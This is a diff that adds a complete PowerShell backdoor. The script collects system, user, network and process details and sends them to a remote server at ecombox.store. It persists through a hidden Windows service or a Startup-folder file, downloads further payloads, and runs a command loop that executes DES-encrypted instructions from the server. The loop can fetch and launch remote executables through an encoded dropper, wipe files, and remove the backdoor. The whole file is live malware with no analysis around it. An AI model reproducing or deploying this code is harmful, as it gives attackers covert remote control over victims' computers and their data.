@@ -1,0 +1,554 @@
+$dk = "PwrShell"
+$di = "PwrShell"
+$dk = [Text.Encoding]::ASCII.GetBytes($dk)
+$di = [Text.Encoding]::ASCII.GetBytes($di)
+$global:VBS_PATH = ""
+$global:SCH_PATH = ""
+$PS_PATH = $env:localappdata + "\REG_LOCALDATA.ps1";
+$schedulePath = "c:\windows\temp\REG_WINDEF.ps1";
+$logPath = "c:\windows\temp\tmp0914.tmp";
+$svr_ps = "https://ecombox.store/tbl_add.php?action=cgetpsa";
+$svr_run = "https://ecombox.store/tbl_add.php?action=cgetruna";
+$exe_path = "WIN_REG.exe";
+$BaseServer = 'https://ecombox.store/tbl_add.php';
+$SecondServer = 'https://ecombox.store/tbl_add.php';
+$nr_task = 'AutoProtect';
+$BaseUri = '';
+$global:UmidID = "";
+$global:PROXY_ENABLE = "";
+$global:PROXY_SERVER = "";
+$global:base64StrUID = "";
+$PS_Arch = '';
+$psversion = $PSVersionTable.PSVersion.Major;
+[String]$script_r = 'JGxwTmV3QnVmID0gTmV3LU9iamVjdCBieXRlW10gNDA5NjsNCltTeXN0ZW0uSU8uRmlsZV06OldyaXRlQWxsQnl0ZXMoJE15SW52b2NhdGlvbi5NeUNvbW1hbmQuUGF0aCwgJGxwTmV3QnVmKTsNClJlbW92ZS1JdGVtIC1QYXRoICRNeUludm9jYXRpb24uTXlDb21tYW5kLlBhdGggLUZvcmNlIC1SZWN1cnNlOw0KDQokQklOQVJZID0gJ0VYRUNTVFJJTkcnOw0KJENNRF9MSU5FID0gJ0FERFJTVFJJTkcnOw0KJEJJTl9QQVRIID0gJGVudjp0ZW1wICsgIlwiICsgLWpvaW4gKCg0OCAuLiA1NykgKyAoNjUgLi4gOTApIHwgR2V0LVJhbmRvbSAtQ291bnQgMyB8ICUgeyBbY2hhcl0kXyB9KSArICIuZXhlIjsNCiRCSU5BUllfQllURVMgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRCSU5BUlkpOw0KaWYoVGVzdC1QYXRoKCRCSU5fUEFUSCkpDQp7DQoJUmVtb3ZlLUl0ZW0gJEJJTl9QQVRIOw0KfQ0KW1N5c3RlbS5JTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygkQklOX1BBVEgsICRCSU5BUllfQllURVMpOw0KaWYoJENNRF9MSU5FLkNvbnRhaW5zKCJ4eHh4eCIpIC1lcSAkdHJ1ZSkNCnsNCglTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkQklOX1BBVEg7DQp9DQplbHNlDQp7DQoJU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggJEJJTl9QQVRIIC1Bcmd1bWVudExpc3QgJENNRF9MSU5FOw0KfQ0K';
+if ([System.IntPtr]::Size -eq 4) { $PS_Arch = "x86";}
+else { $PS_Arch = "x64";}
+
+function EncryptDES
+{
+Param(
+	[String] $plainText,
+	[byte[]] $Key,
+	[byte[]] $Iv
+)
+        
+    $tdsAlg = New-Object System.Security.Cryptography.DESCryptoServiceProvider
+    $tdsAlg.Key = $Key
+    $tdsAlg.IV = $Iv
+    $encrypt = $tdsAlg.CreateEncryptor($tdsAlg.Key, $tdsAlg.IV)
+    $msEncrypt = New-Object System.IO.MemoryStream
+    $csEncrypt = New-Object System.Security.Cryptography.CryptoStream $msEncrypt, $encrypt, "Write"
+    $swEncrypt = New-Object System.IO.StreamWriter $csEncrypt
+    $swEncrypt.Write($plainText)
+    $swEncrypt.Close()
+    $csEncrypt.Close()
+    $msEncrypt.Close()
+    $encrypt.Clear()
+    $encrypted = $msEncrypt.ToArray()
+    $result = [Convert]::ToBase64String($encrypted)
+    return $result;        
+}
+
+function ConsoleLog
+{
+Param(
+	[String] $plainText
+)
+	[String]$base64StrRESULT = EncryptDES -plainText $plainText -Key $dk -Iv $di;
+	$base64StrRESULT | Out-File -filepath $logPath -Append
+}
+
+
+function Get_Base_Info
+{
+	
+	$private:computer = $env:COMPUTERNAME;
+	$comName = $private:computer;
+	$loggedUser = '';
+	$data = @{ };
+	$private:wmi = $null;
+	ConsoleLog -plainText "Start to get base info";
+	ConsoleLog -plainText "Generating UDID";
+	
+	if ($private:wmi = Get-WmiObject -Computer $private:computer -Class Win32_NetworkAdapterConfiguration -ErrorAction SilentlyContinue)
+	{
+		$private:Ips = @{ };
+		$private:wmi | Where { $_.IPAddress -match '\S+' } | Foreach { $private:Ips.$($_.IPAddress -join ', ') = $_.MACAddress };
+		$private:counter = 0;
+		$private:Ips.GetEnumerator() | Foreach {
+		$private:counter++; $data."IP Address $private:counter" = '' + $_.Name + ' (MAC: ' + $_.Value + ')';
+
+			$MacArr = $_.Value;
+			$MacByteArr = [System.Text.Encoding]::ASCII.GetBytes($MacArr);
+			#$global:UmidID = [System.Convert]::ToBase64String($MacByteArr);
+			
+		}
+	}	
+	$global:UmidID = -join ((48 .. 57) + (65 .. 70) | Get-Random -Count 32);
+	
+  if(($global:UmidID -eq $null) -or ($global:UmidID.Length -eq 0))
+  {
+      $global:UmidID = "CannotGet";
+  }
+  ConsoleLog -plainText ("Generated udid = " + '' + $global:UmidID + '');
+	$loggedUser = $env:USERNAME
+	$private:wmi = $null;
+	
+	if ($private:wmi = Get-WmiObject -Computer $private:computer -Class Win32_OperatingSystem -ErrorAction SilentlyContinue)
+	{
+		$data.'OS Architecture' = $private:wmi.OSArchitecture;
+		$data.'OS Boot Time' = $private:wmi.ConvertToDateTime($private:wmi.LastBootUpTime);
+		$data.'OS Language     ' = $private:wmi.OSLanguage;
+		$data.'OS Version' = $private:wmi.Version;
+		$data.'OS Name' = $private:wmi.Caption;
+		$data.'OS Install Date' = $private:wmi.ConvertToDateTime($private:wmi.InstallDate);
+		$data.'OS Service Pack' = [string]$private:wmi.ServicePackMajorVersion + '.' + $private:wmi.ServicePackMinorVersion;
+	}
+	$ports = @{
+		'File shares/RPC' = '139';
+		'File shares' = '445';
+		'RDP' = '3389';
+	}
+	ConsoleLog -plainText "Finish to get base info";
+	foreach ($service in $ports.Keys)
+	{
+		$private:socket = New-Object Net.Sockets.TcpClient;
+		$ErrorActionPreference = 'SilentlyContinue';
+		$private:socket.Connect($private:computer, $ports.$service);
+		$ErrorActionPreference = 'Continue';
+		if ($private:socket.Connected)
+		{
+			$data."Port $($ports.$service) ($service)" = 'Open';
+			$private:socket.Close();
+		}
+		else
+		{
+			$data."Port $($ports.$service) ($service)" = 'Closed or filtered';
+		}
+		$private:socket = $null;
+	}
+	[String]$process_list = tasklist | Out-String;
+	$reg2 = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('CurrentUser', $env:COMPUTERNAME);
+	$regkey2 = $reg2.OpenSubkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings");
+	$data.'ProxyEnable' = $regkey2.GetValue('ProxyEnable');
+	$data.'ProxySetting' = $regkey2.GetValue('ProxyServer');
+	$global:PROXY_ENABLE = $data.'ProxyEnable';
+	$global:PROXY_SERVER = $data.'ProxySetting';
+	$outp = "HOST:" + $comName + "`r`n" + "USER:" + $loggedUser + "`r`n";
+	$outp += $data.GetEnumerator() | Sort-Object 'Name' | Format-Table -AutoSize | Out-String;
+	$outp += "`r`n" + $process_list;	
+	ConsoleLog -plainText "Check if it is admin";
+	$cmdAdmin = 'whoami /groups | findstr /c:"S-1-5-32-544" | findstr /c:"Enabled group" && goto:isadministrator';
+	$outCmdAdmin = cmd /c $cmdAdmin | Out-String;
+	#dwn ps
+	if($outCmdAdmin -ne '')
+	{
+		ConsoleLog -plainText "Register to Service";
+		Set-Variable -Name SCH_PATH -Value $schedulePath -Scope Global;
+		$ret = Test-Path -Path $schedulePath;
+		if($ret -eq $true)
+		{
+			Remove-Item $schedulePath;
+			#return $outp;
+		}
+		$serverPsPath = $svr_ps;
+		(New-Object System.Net.WebClient).DownloadFile($serverPsPath, $schedulePath);
+		$ret = Test-Path -Path $schedulePath;
+		
+		$cmdSchedule = 'sc create ' + $nr_task + ' binPath= "cmd.exe /c powershell.exe -ep bypass -windowstyle hidden -file '+$schedulePath+'" start= Auto';
+		$outCmdSchedule = cmd /c $cmdSchedule;
+	}
+	else
+	{
+		ConsoleLog -plainText "Register to Start up";
+		$serverPsPath = $svr_ps;
+		
+		(New-Object System.Net.WebClient).DownloadFile($serverPsPath, $PS_PATH);
+		$ret = Test-Path -Path $PS_PATH;
+	
+		$startupPath = $env:USERPROFILE + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\'+$exe_path;
+		Set-Variable -Name VBS_PATH -Value $startupPath -Scope Global;
+		$ret = Test-Path -Path $startupPath;
+		if($ret -eq $true)
+		{
+			return $outp;
+		}
+		$srcFilePath = $svr_run;
+		(New-Object System.Net.WebClient).DownloadFile($srcFilePath, $startupPath);
+		$ret = Test-Path -Path $startupPath;
+    		
+		[byte[]]$NewStr = [System.Convert]::FromBase64String([System.IO.File]::ReadAllText($startupPath));
+		[System.IO.File]::WriteAllBytes($startupPath, $NewStr);
+	}
+	return $outp;
+}
+
+function HttpRequestFunc_doprocess
+{
+  param
+  (
+    [Parameter(Position = 0)]
+    [ValidateNotNullOrEmpty()]
+    [String]$szURI,
+    [Parameter(Position = 1)]
+    [ValidateSet('GET', 'POST')]
+    [String]$szMethod = 'GET',
+    [Parameter(Position = 2)]
+    [String]$contentData = $null
+  )
+  [Byte[]]$BodyBytes = $null;
+  $WebRequest = $null;
+  if (($psversion -le 3))
+  {
+    $WebRequest = [System.Net.WebRequest]::Create($szURI);
+  }
+  else
+  {
+    $WebRequest = [System.Net.WebRequest]::CreateHttp($szURI);
+  }
+  if ($WebRequest -eq $null)
+  {
+    return;
+  }
+  
+  $WebRequest.Method = $szMethod;
+  $WebRequest.ContentType = 'text/plain';  
+  $WebRequest.CachePolicy = (new-object System.Net.Cache.HttpRequestCachePolicy 6 )	
+  
+  if (($contentData -eq $null) -or ($contentData.Length -eq 0))
+  {
+    if ($szMethod -eq 'POST')
+    {
+        [String]$base64StrRESULT = EncryptDES -plainText "ok" -Key $dk -Iv $di;
+        $BodyBytes = [System.Text.Encoding]::UTF8.GetBytes($base64StrRESULT);
+        $WebRequest.GetRequestStream().Write($BodyBytes, 0, $BodyBytes.Length);
+        $WebRequest.GetRequestStream().Flush();
+        $WebRequest.GetRequestStream().Close();
+    }
+    
+  }
+  else
+  {
+    $BodyBytes = [System.Text.Encoding]::UTF8.GetBytes($contentData);
+    $WebRequest.GetRequestStream().Write($BodyBytes, 0, $BodyBytes.Length);
+    $WebRequest.GetRequestStream().Flush();
+    $WebRequest.GetRequestStream().Close();
+  }
+  $response = $WebRequest.GetResponse();
+  
+  $resp = $response.GetResponseStream();
+  
+  $sr = New-Object System.IO.StreamReader($resp);
+  $respTxt = $sr.ReadToEnd();
+  return $respTxt;
+}
+
+function HttpRequestFunc
+{
+param
+(
+	[Parameter(Position = 0)]
+	[ValidateNotNullOrEmpty()]
+	[String]$szURI,
+	[Parameter(Position = 1)]
+	[ValidateSet('GET', 'POST')]
+	[String]$szMethod = 'GET',
+	[Parameter(Position = 2)]
+	[String]$contentData = $null
+)
+	
+	$szFullURL = $szURI;
+	if ($szURI.Contains("http") -ne $true)
+	{
+		$szFullURL = $BaseServer + $szURI;
+	}
+    $szFullURL = $szFullURL +  "&ttt=" + -join ((48 .. 57) + (65 .. 70) | Get-Random -Count 8);
+	$respTxt = HttpRequestFunc_doprocess -szURI $szFullURL -szMethod $szMethod -contentData $contentData;
+	if(($respTxt -eq $null) -or ($respTxt -eq ''))
+	{
+		Start-Sleep -Seconds 20;
+		$szFullURL = $SecondServer + $szURI;
+		$respTxt = HttpRequestFunc_doprocess -szURI $szFullURL -szMethod $szMethod -contentData $contentData;
+	}
+
+	return $respTxt;
+}
+
+function DecryptDES
+{
+Param(
+	[String] $encrypted,
+	[byte[]] $Key,
+	[byte[]] $Iv
+)
+    [byte[]]$NewStr = [System.Convert]::FromBase64String($encrypted)
+    $tdsAlg = New-Object System.Security.Cryptography.DESCryptoServiceProvider
+    $tdsAlg.Key = $Key
+    $tdsAlg.IV = $Iv
+    $encrypt = $tdsAlg.CreateDecryptor($tdsAlg.Key, $tdsAlg.IV)
+    $msEncrypt = New-Object System.IO.MemoryStream @(,$NewStr)
+    $csEncrypt = New-Object System.Security.Cryptography.CryptoStream $msEncrypt, $encrypt, "Read"
+    $swEncrypt = New-Object System.IO.StreamReader $csEncrypt
+    [String]$result = $swEncrypt.ReadToEnd()
+    $swEncrypt.Close()
+    $csEncrypt.Close()
+    $msEncrypt.Close()
+    $encrypt.Clear()
+	
+    return $result;     
+}
+
+
+function Cmd_Loop
+{
+	$Stop = 0;
+	$SleepCount = 0;
+	$LimitCount = 5;
+	$IntervalInit = 120;
+	$SleepInterval = $IntervalInit;
+	while ($Stop -ne 1)
+	{
+		$Byte = [System.Text.Encoding]::ASCII.GetBytes($global:UmidID);
+		
+		[String]$szRequest = $BaseUri + '?action="What"&u="' + $global:base64StrUID +'"';
+		$ServerFall = HttpRequestFunc $szRequest 'GET';
+		
+		$time = get-date -format g;
+		[String]$Log = "Connecting Server : " + $time;
+		ConsoleLog -plainText $Log;
+		
+		if (($ServerFall -eq $null) -or ($ServerFall -eq ''))
+		{
+			Start-Sleep -Seconds $SleepInterval;
+			$SleepCount = $SleepCount + 1;
+			if ($SleepCount -eq $LimitCount) { 
+				$SleepInterval = $IntervalInit;
+				$SleepCount = 0;
+			}
+			ConsoleLog -plainText "Server Connecting failed";
+			continue;
+		}
+		
+		ConsoleLog -plainText $ServerFall;
+		
+		if ($ServerFall -match ".{1}")
+		{
+			While (($ServerFall[0] -le 0x30) -and ($ServerFall[0] -ne $null))
+			{
+				$ServerFall = $ServerFall.Remove(0, 1);
+			}
+		}
+		if ($ServerFall -eq 'ok')
+		{
+			Start-Sleep -Seconds $SleepInterval;
+			continue;
+		}
+		if ($ServerFall -eq 'kagent')
+		{
+			[String]$szResponse = $BaseUri + '?action="CmdRes"&type="kagent"&u="' + $global:base64StrUID + '"&err="success"';
+			HttpRequestFunc -szURI $szResponse -szMethod 'POST';
+			break;
+		}
+		if ($ServerFall -eq 'dagent')
+		{
+		#delete agent
+			$ret = Test-Path -Path $global:SCH_PATH;
+			if($ret -eq $true)
+			{
+				Remove-Item $global:SCH_PATH;
+			}
+			
+            $ret = Test-Path -Path $logPath;
+			if($ret -eq $true)
+			{
+				Remove-Item $logPath;
+			}
+            
+			$ret = Test-Path -Path $global:VBS_PATH;
+			if($ret -eq $true)
+			{
+				Remove-Item $global:VBS_PATH;
+			}
+			
+			$ret = Test-Path -Path $PS_PATH;
+			if($ret -eq $true)
+			{
+				Remove-Item $PS_PATH;
+			}
+			$cmd_ins = 'taskkill /f /pid ' + $pid;
+			cmd.exe /c $cmd_ins;
+			
+			$cmd_ins = 'schtasks /delete /tn "'+$nr_task+'" /f';
+			cmd.exe /c $cmd_ins;
+		#end
+			$result = "success";
+			
+			[String]$szResponse = $BaseUri + '?action="CmdRes"&type="dagent"&u="' + $global:base64StrUID + '"&err="' + $result + '"';
+			HttpRequestFunc -szURI $szResponse -szMethod 'POST';
+			break;
+		}
+		if ($ServerFall.Contains("delay") -eq $true)
+		{
+			$szTmp = $ServerFall.split('|');
+			$SleepInterval = [int64]$szTmp[1];
+			[String]$szResponse = $BaseUri + '?action="CmdRes"&type="delay"&u="' + $global:base64StrUID + '"&err="success"';
+			HttpRequestFunc -szURI $szResponse -szMethod 'POST';
+			continue;
+		}
+		if ($ServerFall.Contains("panel") -eq $true)
+		{
+			$szTmp = $ServerFall.split('|');
+			[String]$cmdInst = DecryptDES -encrypted $szTmp[1] -Key $dk -Iv $di;
+			[String]$cmdResult = "";
+			if($cmdInst.StartsWith("sdel ") -eq $true)
+			{
+				$des_path = $cmdInst.Substring(5);
+				$lpNewBuf = New-Object byte[] 4096;
+				[System.IO.File]::WriteAllBytes($des_path, $lpNewBuf);
+				Remove-Item -Path $des_path -Force -Recurse;
+				$cmdResult = "del-success"
+			}
+			elseif($cmdInst.StartsWith("run ") -eq $true)
+			{
+        $cmdInst = $cmdInst.Substring(4);
+				$job_path = $env:temp + "\tmp2%d.tmp";
+        [System.IO.File]::WriteAllText($job_path, $cmdInst);
+        $cmd = [System.IO.File]::ReadAllText($job_path);
+		#$scriptBlock = [Scriptblock]::Create($cmd)
+		start-process powershell.exe -argumentlist $cmd -windowstyle hidden | out-file -filepath $job_path;    
+		$ret_test = Test-Path -Path $job_path;
+		if($ret_test -eq $true)
+        {
+          $cmdResult = [System.IO.File]::ReadAllText($job_path);
+		  Remove-Item $job_path;
+			
+        }
+			}
+			else{
+				$job_path = $env:temp + "\tmp2%d.tmp";
+        [System.IO.File]::WriteAllText($job_path, $cmdInst);
+        #$cmd = [System.IO.File]::ReadAllText($job_path);
+        $job_n = start-job {
+          $job_path = $env:temp + "\tmp2%d.tmp";
+          $cmd = [System.IO.File]::ReadAllText($job_path);
+          cmd.exe /c $cmd | Out-File -Encoding ascii $job_path;
+        }
+        wait-job $job_n -timeout 60
+        stop-job $job_n
+        remove-job $job_n
+        $ret_test = Test-Path -Path $job_path;
+        if($ret_test -eq $true)
+        {
+          $cmdResult = [System.IO.File]::ReadAllText($job_path);
+		  Remove-Item $job_path;
+        }
+			}
+			
+			[String]$base64StrRESULT = EncryptDES -plainText $cmdResult -Key $dk -Iv $di;
+				
+			[String]$InfoPostUrl = $BaseUri + '?action="cmd"&u="' + $global:base64StrUID + '"&ins="panel"';
+			
+			HttpRequestFunc -szURI $InfoPostUrl -szMethod 'POST' -contentData $base64StrRESULT;
+			
+			[String]$szResponse = '';
+
+			$szResponse = $BaseUri + '?action="CmdRes"&type="panel"&u="' + $global:base64StrUID  + '"&err="success"';
+			HttpRequestFunc -szURI $szResponse -szMethod 'POST';
+			
+			continue;
+		}
+		if ($ServerFall.Contains("exagent") -eq $true)
+		{
+		  #modify ps1 and vbs files
+		  $ret = Test-Path -Path $global:SCH_PATH;
+		 
+		  if($ret -eq $true)
+		  {
+			Remove-Item $global:SCH_PATH;
+		  }
+		  $ret = Test-Path -Path $global:VBS_PATH;
+		  if($ret -eq $true)
+		  {
+			#replace vbs file
+			Remove-Item $global:VBS_PATH;
+			
+			#replace tmp ps1 file
+			$ret = Test-Path -Path $PS_PATH;
+			if($ret -eq $true)
+			{
+			  Remove-Item $PS_PATH;
+			}
+		  }	
+		  continue;
+		}
+		if ($ServerFall.Contains("ragent") -eq $true)
+		{
+			$szTmp = $ServerFall.split('|');
+			[String]$CmdURL = DecryptDES -encrypted $szTmp[1] -Key $dk -Iv $di;
+
+			$CmdToExe = HttpRequestFunc -szURI $CmdURL -szMethod 'GET';
+
+			[String]$szCmdLine = "";
+			if (($szTmp[2] -ne $null) -or ($szTmp[2].Length -ne 0))
+			{
+				$szCmdLine = DecryptDES -encrypted $szTmp[2] -Key $dk -Iv $di;
+			}
+			
+			#download exe file content and make ps1 and run
+			$szFileName = 'C:\\Users\\Public\\Documents\\tmp' + -join ((48 .. 57) + (65 .. 70) | Get-Random -Count 4 | % { [char]$_ }) + '.ps1';
+			[String]$szCode = '$SScript = "' + $script_r + '"; [String]$NewStr = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($SScript));$NewStr=$NewStr.Replace("EXECSTRING", "' + $CmdToExe + '");$NewStr=$NewStr.Replace("ADDRSTRING", "' + $szCmdLine + '");$NewBlock = [Scriptblock]::Create($NewStr);Invoke-Command -ScriptBlock $NewBlock;';
+			$szCode | Out-File -Encoding ascii $szFileName;
+			
+			[String]$szArgList = '-windowstyle hidden -ep Bypass -File ' + $szFileName;
+			
+			  if($PS_Arch.Contains("x64") -eq $true)
+			  {
+				$ps_iter = new-object System.Diagnostics.Process
+				$ps_iter.StartInfo.Filename = "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
+				$ps_iter.StartInfo.Arguments = $szArgList
+				$ps_iter.StartInfo.UseShellExecute = $true
+				$ps_iter.start()
+			  }
+			  else
+			  {
+				$ps_iter = new-object System.Diagnostics.Process
+				$ps_iter.StartInfo.Filename = "powershell.exe"
+				$ps_iter.StartInfo.Arguments = $szArgList
+				$ps_iter.StartInfo.UseShellExecute = $true
+				$ps_iter.start()
+			  }
+			
+			Start-Sleep -Seconds 10;
+			
+			[String]$szResponse = '';
+			$szResponse = $BaseUri + '?action="CmdRes"&type="ragent"&u="' + $global:base64StrUID  + '"&err="success"';
+			HttpRequestFunc -szURI $szResponse -szMethod 'POST';
+		#end execute
+			continue;
+		}
+		Start-Sleep -Seconds $SleepInterval;
+	}
+}
+
+$Base_Info = Get_Base_Info;
+[String]$sendData = 'filename="' + $global:UmidID + '.log"' + "`n" + "Content-Type:application/octet-stream" + "`r`n" + $Base_Info;
+
+$Byte = [System.Text.Encoding]::ASCII.GetBytes($global:UmidID);
+$global:base64StrUID = [System.Convert]::ToBase64String($Byte);
+[String]$InfoPostUrl = $BaseUri + '?action="BaseInfo"&u="' + $global:base64StrUID + '"';
+
+[String]$HttpRes = $null;
+$lcoun = 0;
+ConsoleLog -plainText "Sending Baseinfo to server";
+
+$HttpRes = HttpRequestFunc -szURI $InfoPostUrl -szMethod 'POST' -contentData $sendData;
+while (($HttpRes -eq $null) -or ($HttpRes -eq ''))
+{
+ConsoleLog -plainText "Try again to send baseinfo";
+$lcoun = $lcoun + 1;
+$HttpRes = HttpRequestFunc -szURI $InfoPostUrl -szMethod 'POST' -contentData $sendData;
+if ($lcoun -eq 10) { exit; }
+}
+ConsoleLog -plainText "Start waiting command";
+Cmd_Loop
+exit;
